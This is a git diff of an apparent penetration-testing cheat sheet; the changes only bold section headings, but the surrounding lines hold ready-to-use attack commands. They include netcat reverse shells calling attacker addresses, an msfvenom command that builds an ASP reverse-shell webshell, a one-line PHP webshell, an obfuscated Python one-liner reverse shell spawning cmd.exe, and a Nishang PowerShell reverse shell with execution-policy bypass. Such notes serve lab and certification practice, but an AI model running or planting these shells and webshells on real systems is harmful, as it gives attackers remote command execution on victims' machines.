@@ -148,13 +148,13 @@ cf : https://github.com/rapid7/metasploit-framework/issues/9556 <br />
 //Staged     : (windows/shell/reverse_tcp) && use exploit/multi/handler
 ```
 
--netcat
+**-netcat**
 ```sh 
 //Windows(Victim) : nc.exe 10.11.0.69 4444 -e cmd.exe
 //eg. C:\Inetpub\Scripts\nc.exe -nv 10.11.0.45 1234 -e C:\WINDOWS\System32\cmd.exe
 //Kali(Attacker) : nc -nlvp 4444
 ```
--Creating Webshell
+**-Creating Webshell**
 ```sh 
 ASP : msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.45 LPORT=2323 -f asp -a x86 --platform win -o shell.asp
       
@@ -166,7 +166,7 @@ PHP : <?php echo passthru($_GET['cmd']); ?>
 ```
 ref : https://netsec.ws/?p=331
 
--Python Oneliner ReverseShell on CMD  *Make sure updating IP address and Port. *
+**-Python Oneliner ReverseShell on CMD**  *Make sure updating IP address and Port. *
 ```sh 
 C:\Python26\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.*.*.*', ***)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
 ```
@@ -175,7 +175,7 @@ powershell -exec bypass -c Import-Module .\Invoke-PowerShellTcp.ps1;Invoke-Power
 ```
 ref : https://github.com/samratashok/nishang<br />
 
-Powershell location<br />
+**Powershell location**<br />
 ```sh 
 -32-bit (x86) PowerShell executable C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe  
 -64-bit (x64) Powershell executable C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe  
